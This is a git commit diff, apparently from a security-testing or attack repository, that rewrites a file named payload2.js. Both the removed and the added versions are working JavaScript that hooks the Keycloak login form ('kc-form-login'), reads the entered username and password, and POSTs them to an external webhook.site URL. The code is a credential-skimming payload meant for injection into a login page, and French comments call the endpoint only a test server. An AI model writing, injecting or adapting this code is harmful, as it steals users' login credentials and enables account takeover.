1356f37445ee568cb0cf0c8c41728706ecd8bdd9
Jok3r <115065483+Vault-of-Jok3r@users.noreply.github.com>
2025-03-10 14:08:51 +0100

    Update payload2.js

--- payload2.js
+++ payload2.js
@@ -1,15 +1,22 @@
-var form = document.getElementById('kc-form-login');
-form.addEventListener('submit', function(e) {
-  var user = document.getElementById('username').value;
-  var pass = document.getElementById('password').value;
+(function() {
+  var form = document.getElementById('kc-form-login');
 
-  // Hypothétique envoi vers un serveur de test
-  fetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      username: user,
-      password: pass
-    })
-  });
-});
+  if (form) {
+    form.addEventListener('submit', function(e) {
+      var user = document.getElementById('username')?.value || '';
+      var pass = document.getElementById('password')?.value || '';
+
+      // Envoi à Webhook.site
+      fetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: user,
+          password: pass
+        })
+      });
+    });
+  } else {
+    alert('Le formulaire n’a pas été trouvé !');
+  }
+})();
